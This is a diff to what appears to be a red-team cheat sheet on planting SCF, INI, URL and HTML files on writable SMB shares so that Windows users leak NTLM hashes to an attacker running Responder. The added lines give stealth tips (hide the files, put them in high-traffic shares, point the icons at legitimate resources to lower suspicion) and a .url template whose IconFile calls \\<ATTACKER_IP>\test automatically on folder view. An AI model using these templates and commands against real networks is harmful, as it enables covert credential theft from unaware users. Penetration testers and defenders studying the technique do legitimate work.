@@ -1,3 +1,12 @@
+# General Guidelines
+1. try to place the below files in place that you know will be visited alot. Examples include:
+	- Public Network Shares
+	- The Public User desktop --> is loaded for all users on a machine
+2. use the folder/ini combination as it's stealthy
+3. have the SMB links point to legit icons to lower suspicion
+4. by the same concept, have the image urls point to legit images
+5. Trick: you can always point to a non-existing name and responder will respond to that
+
 # Automatic on folder/share visit I: SCF Files
 ```
 [Shell]
@@ -52,14 +61,17 @@ smb: \> setmode <INI_FILE> +h
 ```
 11. fire up responder `responder -I eth0`
 
-# Works when *Selected*: URL files
+# Automatic on folder/share visit IV: URL files
 ```
 [InternetShortcut]
-URL=file://<ATTACKER_IP>/@IEsettings
+URL=<URL_OF_CHOICE>
+WorkingDirectory=<DIR_OF_CHOICE>
+IconFile=\\<ATTACKER_IP>\test
+IconIndex=1
 ```
 1. Put the contents into a non-suspicious file name like `IESettings.url`
 2. *If you created the file on a linux system,* use `unix2dos` to make it suitable for windows
-3. Place the file in the writable SMB share (won't work if hidden)
+3. Place the file in the writable SMB share (will work if hidden and the user enabled `show hidden files`. otherwise won't work)
 4. Fire up responder `responder -I eth0`
 
 # Must be opened to work: HTML files (tested on IE & Chrome)
